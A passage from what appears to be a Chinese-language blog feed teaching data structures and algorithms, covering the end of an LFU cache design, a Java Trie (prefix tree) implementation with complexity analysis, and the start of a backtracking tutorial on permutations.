class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">increaseFreq</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> freq = keyToFreq.get(key);<br>    <span class="hljs-comment">/* 更新 KF 表 */</span><br>    keyToFreq.put(key, freq + <span class="hljs-number">1</span>);<br>    <span class="hljs-comment">/* 更新 FK 表 */</span><br>    <span class="hljs-comment">// 将 key 从 freq 对应的列表中删除</span><br>    freqToKeys.get(freq).remove(key);<br>    <span class="hljs-comment">// 将 key 加入 freq + 1 对应的列表中</span><br>    freqToKeys.putIfAbsent(freq + <span class="hljs-number">1</span>, <span class="hljs-keyword">new</span> LinkedHashSet&lt;&gt;());<br>    freqToKeys.get(freq + <span class="hljs-number">1</span>).add(key);<br>    <span class="hljs-comment">// 如果 freq 对应的列表空了，移除这个 freq</span><br>    <span class="hljs-keyword">if</span> (freqToKeys.get(freq).isEmpty()) &#123;<br>        freqToKeys.remove(freq);<br>        <span class="hljs-comment">// 如果这个 freq 恰好是 minFreq，更新 minFreq</span><br>        <span class="hljs-keyword">if</span> (freq == <span class="hljs-keyword">this</span>.minFreq) &#123;<br>            <span class="hljs-keyword">this</span>.minFreq++;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>更新某个<code>key</code>的<code>freq</code>肯定会涉及<code>FK</code>表和<code>KF</code>表，所以我们分别更新这两个表就行了。</p><p>和之前类似，当<code>FK</code>表中<code>freq</code>对应的列表被删空后，需要删除<code>FK</code>表中<code>freq</code>这个映射。如果这个<code>freq</code>恰好是<code>minFreq</code>，说明<code>minFreq</code>变量需要更新。</p><p>能不能快速找到当前的<code>minFreq</code>呢？这里是可以的，因为我们刚才把<code>key</code>的<code>freq</code>加了 1 嘛，所以<code>minFreq</code>也加 1 就行了。</p><p>至此，经过层层拆解，LFU 算法就完成了。</p><h1 id="4-前缀树"><a href="#4-前缀树" class="headerlink" title="4. 前缀树"></a>4. 前缀树</h1><h2 id="4-1-应用"><a href="#4-1-应用" class="headerlink" title="4.1 应用"></a>4.1 应用</h2><p>Trie (发音为 “try”) 或前缀树是一种树数据结构，用于检索字符串数据集中的键。这一高效的数据结构有多种应用：</p><ol><li>自动补全</li></ol><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/前缀树1.png" alt="前缀树1" style="zoom:50%;" /></p><p>​                                                                            图 1. 谷歌的搜索建议</p><ol><li>拼写检查</li></ol><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/前缀树2.png" alt="前缀树2" style="zoom: 67%;" /></p><p>​                                                                     图2. 文字处理软件中的拼写检查</p><ol><li>IP 路由 (最长前缀匹配)</li></ol><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/前缀树3.gif" alt="前缀树3" style="zoom:50%;" /></p><p>​                    图 3. 使用Trie树的最长前缀匹配算法，Internet 协议（IP）路由中利用转发表选择路径。</p><ol><li>T9 (九宫格) 打字预测</li></ol><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/前缀树4.jpg" alt="前缀树4"></p><p>​                                            图 4. T9（九宫格输入），在 20 世纪 90 年代常用于手机输入</p><p>还有其他的数据结构，如平衡树和哈希表，使我们能够在字符串数据集中搜索单词。为什么我们还需要 Trie 树呢？尽管哈希表可以在 O(1)时间内寻找键值，却无法高效的完成以下操作：</p><ul><li>找到具有同一前缀的全部键值。</li><li>按词典序枚举字符串的数据集。</li></ul><p>​        Trie 树优于哈希表的另一个理由是，随着哈希表大小增加，会出现大量的冲突，时间复杂度可能增加到 O(n)，其中 n 是插入的键的数量。与哈希表相比，Trie 树在存储多个具有相同前缀的键时可以使用较少的空间。此时 Trie 树只需要O(m) 的时间复杂度，其中 m 为键长。而在平衡树中查找键值需要 $O(m \log n)$ 时间复杂度。</p><h2 id="4-2-Trie-树的结点结构"><a href="#4-2-Trie-树的结点结构" class="headerlink" title="4.2 Trie 树的结点结构"></a>4.2 Trie 树的结点结构</h2><p>Trie 树是一个有根的树，其结点具有以下字段：。</p><ul><li>最多 R 个指向子结点的链接，其中每个链接对应字母表数据集中的一个字母。<br>本文中假定 R 为 26，小写拉丁字母的数量。</li><li>布尔字段，以指定节点是对应键的结尾还是只是键前缀。</li></ul><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/前缀树6.png" alt="前缀树6"></p><p>​                                                                    图 6. 单词 “leet” 在 Trie 树中的表示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TrieNode</span> </span>&#123;<br>    <span class="hljs-comment">// R links to node children</span><br>    <span class="hljs-keyword">private</span> TrieNode[] links;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> R = <span class="hljs-number">26</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">boolean</span> isEnd;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TrieNode</span><span class="hljs-params">()</span> </span>&#123;<br>        links = <span class="hljs-keyword">new</span> TrieNode[R];<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">containsKey</span><span class="hljs-params">(<span class="hljs-keyword">char</span> ch)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> links[ch -<span class="hljs-string">&#x27;a&#x27;</span>] != <span class="hljs-keyword">null</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> TrieNode <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-keyword">char</span> ch)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> links[ch -<span class="hljs-string">&#x27;a&#x27;</span>];<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">put</span><span class="hljs-params">(<span class="hljs-keyword">char</span> ch, TrieNode node)</span> </span>&#123;<br>        links[ch -<span class="hljs-string">&#x27;a&#x27;</span>] = node;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setEnd</span><span class="hljs-params">()</span> </span>&#123;<br>        isEnd = <span class="hljs-keyword">true</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isEnd</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> isEnd;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Trie 树中最常见的两个操作是键的插入和查找。</p><h2 id="4-3-向-Trie-树中插入键"><a href="#4-3-向-Trie-树中插入键" class="headerlink" title="4.3 向 Trie 树中插入键"></a>4.3 向 Trie 树中插入键</h2><p>我们通过搜索 Trie 树来插入一个键。我们从根开始搜索它对应于第一个键字符的链接。有两种情况：</p><ul><li>链接存在。沿着链接移动到树的下一个子层。算法继续搜索下一个键字符。</li><li>链接不存在。创建一个新的节点，并将它与父节点的链接相连，该链接与当前的键字符相匹配。<br>重复以上步骤，直到到达键的最后一个字符，然后将当前节点标记为结束节点，算法完成。</li></ul><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/前缀树7.png" alt="前缀树7" style="zoom:50%;" /></p><p>​                                                                        图 7. 向 Trie 树中插入键</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Trie</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> TrieNode root;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Trie</span><span class="hljs-params">()</span> </span>&#123;<br>        root = <span class="hljs-keyword">new</span> TrieNode();<br>    &#125;<br><br>    <span class="hljs-comment">// Inserts a word into the trie.</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(String word)</span> </span>&#123;<br>        TrieNode node = root;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; word.length(); i++) &#123;<br>            <span class="hljs-keyword">char</span> currentChar = word.charAt(i);<br>            <span class="hljs-keyword">if</span> (!node.containsKey(currentChar)) &#123;<br>                node.put(currentChar, <span class="hljs-keyword">new</span> TrieNode());<br>            &#125;<br>            node = node.get(currentChar);<br>        &#125;<br>        node.setEnd();<br>    &#125;<br> &#125;<br></code></pre></td></tr></table></figure><p>复杂度分析</p><ul><li>时间复杂度：O(m)，其中 m 为键长。在算法的每次迭代中，我们要么检查要么创建一个节点，直到到达键尾。只需要 m 次操作。</li><li>空间复杂度：O(m)。最坏的情况下，新插入的键和 Trie 树中已有的键没有公共前缀。此时需要添加 m 个结点，使用 O(m) 空间。</li></ul><h2 id="4-4-在-Trie-树中查找键"><a href="#4-4-在-Trie-树中查找键" class="headerlink" title="4.4 在 Trie 树中查找键"></a>4.4 在 Trie 树中查找键</h2><p>​        每个键在 trie 中表示为从根到内部节点或叶的路径。我们用第一个键字符从根开始。检查当前节点中与键字符对应的链接。有两种情况：</p><ul><li>存在链接。我们移动到该链接后面路径中的下一个节点，并继续搜索下一个键字符。</li><li>不存在链接。若已无键字符，且当前结点标记为 isEnd，则返回 true。否则有两种可能，均返回 false :<ul><li>还有键字符剩余，但无法跟随 Trie 树的键路径，找不到键。</li><li>没有键字符剩余，但当前结点没有标记为 isEnd。也就是说，待查找键只是Trie树中另一个键的前缀。</li></ul></li></ul><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/前缀树8.png" alt="前缀树8" style="zoom: 67%;" /></p><p>​                                                                    图 8. 在 Trie 树中查找键</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Trie</span> </span>&#123;<br>        ...<br>    <span class="hljs-comment">// search a prefix or whole key in trie and</span><br>    <span class="hljs-comment">// returns the node where search ends</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> TrieNode <span class="hljs-title">searchPrefix</span><span class="hljs-params">(String word)</span> </span>&#123;<br>        TrieNode node = root;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; word.length(); i++) &#123;<br>           <span class="hljs-keyword">char</span> curLetter = word.charAt(i);<br>           <span class="hljs-keyword">if</span> (node.containsKey(curLetter)) &#123;<br>               node = node.get(curLetter);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>           &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> node;<br>&#125;<br><br>    <span class="hljs-comment">// Returns if the word is in the trie.</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">search</span><span class="hljs-params">(String word)</span> </span>&#123;<br>       TrieNode node = searchPrefix(word);<br>       <span class="hljs-keyword">return</span> node != <span class="hljs-keyword">null</span> &amp;&amp; node.isEnd();<br>    &#125;<br> &#125;<br></code></pre></td></tr></table></figure><p>复杂度分析</p><ul><li>时间复杂度 : O(m)。算法的每一步均搜索下一个键字符。最坏的情况下需要 m 次操作。</li><li>空间复杂度 : O(1)。</li></ul><h2 id="4-5-查找-Trie-树中的键前缀"><a href="#4-5-查找-Trie-树中的键前缀" class="headerlink" title="4.5 查找 Trie 树中的键前缀"></a>4.5 查找 Trie 树中的键前缀</h2><p>​       该方法与在 Trie 树中搜索键时使用的方法非常相似。我们从根遍历 Trie 树，直到键前缀中没有字符，或者无法用当前的键字符继续 Trie 中的路径。与上面提到的“搜索键”算法唯一的区别是，到达键前缀的末尾时，总是返回 true。我们不需要考虑当前 Trie 节点是否用 “isend” 标记，因为我们搜索的是键的前缀，而不是整个键。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/前缀树9.png" alt="前缀树9" style="zoom: 67%;" /></p><p>​                                                                    图 9. 查找 Trie 树中的键前缀</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Trie</span> </span>&#123;<br>        ...<br>    <span class="hljs-comment">// Returns if there is any word in the trie</span><br>    <span class="hljs-comment">// that starts with the given prefix.</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">startsWith</span><span class="hljs-params">(String prefix)</span> </span>&#123;<br>        TrieNode node = searchPrefix(prefix);<br>        <span class="hljs-keyword">return</span> node != <span class="hljs-keyword">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>复杂度分析</p><ul><li>时间复杂度 : O(m)。</li><li>空间复杂度 : O(1)。</li></ul><p>汇总代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Trie</span> </span>&#123;<br><br>    <span class="hljs-keyword">boolean</span> isEnd = <span class="hljs-keyword">false</span>;<br>    Trie[] next = <span class="hljs-keyword">new</span> Trie[<span class="hljs-number">26</span>];<br>    <br><br><br>    <span class="hljs-comment">/** Initialize your data structure here. */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Trie</span><span class="hljs-params">()</span> </span>&#123;<br><br>    &#125;<br>    <br>    <span class="hljs-comment">/** Inserts a word into the trie. */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(String word)</span> </span>&#123;<br>        Trie root = <span class="hljs-keyword">this</span>;<br>        <span class="hljs-keyword">char</span>[] chars = word.toCharArray();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; chars.length; i++)&#123;<br>            <span class="hljs-keyword">if</span>(root.next[chars[i] - <span class="hljs-string">&#x27;a&#x27;</span>] == <span class="hljs-keyword">null</span>)&#123;<br>                root.next[chars[i] - <span class="hljs-string">&#x27;a&#x27;</span>] = <span class="hljs-keyword">new</span> Trie();<br>            &#125;<br>            root = root.next[chars[i] - <span class="hljs-string">&#x27;a&#x27;</span>];<br>        &#125;<br>        root.isEnd = <span class="hljs-keyword">true</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">/** Returns if the word is in the trie. */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">search</span><span class="hljs-params">(String word)</span> </span>&#123;<br>        Trie root = <span class="hljs-keyword">this</span>;<br>        <span class="hljs-keyword">char</span>[] chars = word.toCharArray();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; chars.length; i++)&#123;<br>            <span class="hljs-keyword">if</span>(root.next[chars[i] - <span class="hljs-string">&#x27;a&#x27;</span>] == <span class="hljs-keyword">null</span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>            &#125;<br>            root = root.next[chars[i] - <span class="hljs-string">&#x27;a&#x27;</span>];<br>        &#125;<br>        <span class="hljs-keyword">return</span> root.isEnd;<br>    &#125;<br>    <br>    <span class="hljs-comment">/** Returns if there is any word in the trie that starts with the given prefix. */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">startsWith</span><span class="hljs-params">(String prefix)</span> </span>&#123;<br>        Trie root = <span class="hljs-keyword">this</span>;<br>        <span class="hljs-keyword">char</span>[] chars = prefix.toCharArray();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; chars.length; i++)&#123;<br>            <span class="hljs-keyword">if</span>(root.next[chars[i] - <span class="hljs-string">&#x27;a&#x27;</span>] == <span class="hljs-keyword">null</span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>            &#125;<br>            root = root.next[chars[i] - <span class="hljs-string">&#x27;a&#x27;</span>];<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">并查集，LRU，LFU，前缀树</summary>
    
    
    
    <category term="算法" scheme="http://example.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="算法" scheme="http://example.com/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="数据结构设计" scheme="http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E8%AE%BE%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>回溯</title>
    <link href="http://example.com/2021/03/11/%E5%9B%9E%E6%BA%AF/"/>
    <id>http://example.com/2021/03/11/%E5%9B%9E%E6%BA%AF/</id>
    <published>2021-03-11T11:52:31.000Z</published>
    <updated>2021-03-11T11:59:19.387Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-回溯算法框架"><a href="#1-回溯算法框架" class="headerlink" title="1. 回溯算法框架"></a>1. 回溯算法框架</h1><p><strong>解决一个回溯问题，实际上就是一个决策树的遍历过程</strong>。你只需要思考 3 个问题：</p><p>1、路径：也就是已经做出的选择。</p><p>2、选择列表：也就是你当前可以做的选择。</p><p>3、结束条件：也就是到达决策树底层，无法再做选择的条件。</p><p>如果你不理解这三个词语的解释，没关系，我们后面会用「全排列」和「N 皇后问题」这两个经典的回溯算法问题来帮你理解这些词语是什么意思，现在你先留着印象。</p><p>代码方面，回溯算法的框架：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">LinkedList&lt;Integer&gt; result = <span class="hljs-keyword">new</span> List&lt;&gt;();<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">backtrack</span><span class="hljs-params">(路径, 选择列表)</span></span>&#123;<br>    <span class="hljs-keyword">if</span> 满足结束条件&#123;<br>        result.add(路径)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <br>    <span class="hljs-keyword">for</span>(选择：选择列表)&#123;<br>        做选择<br>        backtrack(路径, 选择列表)<br>        撤销选择<br>    &#125;   <br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>其核心就是 for 循环里面的递归，在递归调用之前「做选择」，在递归调用之后「撤销选择」</strong>，特别简单。</p><p>什么叫做选择和撤销选择呢，这个框架的底层原理是什么呢？下面我们就通过「全排列」这个问题来解开之前的疑惑，详细探究一下其中的奥妙！</p><h2 id="1-1-全排列问题"><a href="#1-1-全排列问题" class="headerlink" title="1.1 全排列问题"></a>1.1 全排列问题</h2><p>我们在高中的时候就做过排列组合的数学题，我们也知道 <code>n</code> 个不重复的数，全排列共有 n! 个。</p><p>PS：<strong>为了简单清晰起见，我们这次讨论的全排列问题不包含重复的数字</strong>。</p><p>那么我们当时是怎么穷举全排列的呢？比方说给三个数 <code>[1,2,3]</code>，你肯定不会无规律地乱穷举，一般是这样：</p><p>先固定第一位为 1，然后第二位可以是 2，那么第三位只能是 3；然后可以把第二位变成 3，第三位就只能是 2 了；然后就只能变化第一位，变成 2，然后再穷举后两位……</p><p>其实这就是回溯算法，我们高中无师自通就会用，或者有的同学直接画出如下这棵回溯树：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/1.jpg" alt="img" style="zoom:50%;" /></p><p>只要从根遍历这棵树，记录路径上的数字，其实就是所有的全排列。<strong>我们不妨把这棵树称为回溯算法的「决策树」</strong>。</p><p><strong>为啥说这是决策树呢，因为你在每个节点上其实都在做决策</strong>。比如说你站在下图的红色节点上：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/2.jpg" alt="img" style="zoom:50%;" /></p><p>你现在就在做决策，可以选择 1 那条树枝，也可以选择 3 那条树枝。为啥只能在 1 和 3 之中选择呢？因为 2 这个树枝在你身后，这个选择你之前做过了，而全排列是不允许重复使用数字的。</p><p><strong>现在可以解答开头的几个名词：<code>[2]</code> 就是「路径」，记录你已经做过的选择；<code>[1,3]</code> 就是「选择列表」，表示你当前可以做出的选择；「结束条件」就是遍历到树的底层，在这里就是选择列表为空的时候</strong>。</p><p>如果明白了这几个名词，<strong>可以把「路径」和「选择」列表作为决策树上每个节点的属性</strong>，比如下图列出了几个节点的属性：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/回溯3.jpg" alt="img" style="zoom:50%;" /></p><p><strong>我们定义的 <code>backtrack</code> 函数其实就像一个指针，在这棵树上游走，同时要正确维护每个节点的属性，每当走到树的底层，其「路径」就是一个全排列</strong>。</p><p>再进一步，如何遍历一棵树？这个应该不难吧。回忆一下之前「学习数据结构的框架思维」写过，各种搜索问题其实都是树的遍历问题，而多叉树的遍历框架就是这样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">traverse</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (TreeNode child : root.childern)<br>        <span class="hljs-comment">// 前序遍历需要的操作</span><br>        traverse(child);<br>        <span class="hljs-comment">// 后序遍历需要的操作</span><br>&#125;<br></code></pre></td></tr></table></figure><p>而所谓的前序遍历和后序遍历，他们只是两个很有用的时间点，我给你画张图你就明白了：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/回溯4.jpg" alt="img" style="zoom:50%;" /></p><p><strong>前序遍历的代码在进入某一个节点之前的那个时间点执行，后序遍历代码在离开某个节点之后的那个时间点执行</strong>。</p><p>回想我们刚才说的，「路径」和「选择」是每个节点的属性，函数在树上游走要正确维护节点的属性，那么就要在这两个特殊时间点搞点动作：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/回溯5.jpg" alt="img" style="zoom:50%;" /></p><p>现在，你是否理解了回溯算法的这段核心框架？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (选择:选择列表)&#123;<br>     # 做选择<br>    将该选择从选择列表移除<br>    路径.add(选择)<br>    backtrack(路径, 选择列表)<br>    # 撤销选择<br>    路径.remove(选择)<br>    将该选择再加入选择列表<br>&#125; <br></code></pre></td></tr></table></figure><p><strong>我们只要在递归之前做出选择，在递归之后撤销刚才的选择</strong>，就能正确得到每个节点的选择列表和路径。</p><p>下面，直接看全排列代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;List&lt;Integer&gt;&gt; res = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br><br><span class="hljs-comment">/* 主函数，输入一组不重复的数字，返回它们的全排列 */</span><br>List&lt;List&lt;Integer&gt;&gt; permute(<span class="hljs-keyword">int</span>[] nums) &#123;<br>    <span class="hljs-comment">// 记录「路径」</span><br>    LinkedList&lt;Integer&gt; track = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br>    backtrack(nums, track);<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-comment">// 路径：记录在 track 中</span><br><span class="hljs-comment">// 选择列表：nums 中不存在于 track 的那些元素</span><br><span class="hljs-comment">// 结束条件：nums 中的元素全都在 track 中出现</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">backtrack</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, LinkedList&lt;Integer&gt; track)</span> </span>&#123;<br>    <span class="hljs-comment">// 触发结束条件</span><br>    <span class="hljs-keyword">if</span> (track.size() == nums.length) &#123;<br>        res.add(<span class="hljs-keyword">new</span> LinkedList(track));<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.length; i++) &#123;<br>        <span class="hljs-comment">// 排除不合法的选择</span><br>        <span class="hljs-keyword">if</span> (track.contains(nums[i]))<br>            <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-comment">// 做选择</span><br>        track.add(nums[i]);<br>        <span class="hljs-comment">// 进入下一层决策树</span><br>        backtrack(nums, track);<br>        <span class="hljs-comment">// 取消选择</span><br>        track.removeLast();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们这里稍微做了些变通，没有显式记录「选择列表」，而是通过 <code>nums</code> 和 <code>track</code> 推导出当前的选择列表：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/回溯6.jpg" alt="img" style="zoom:50%;" /></p><p>至此，我们就通过全排列问题详解了回溯算法的底层原理。当然，这个算法解决全排列不是很高效，应为对链表使用 <code>contains</code> 方法需要 O(N) 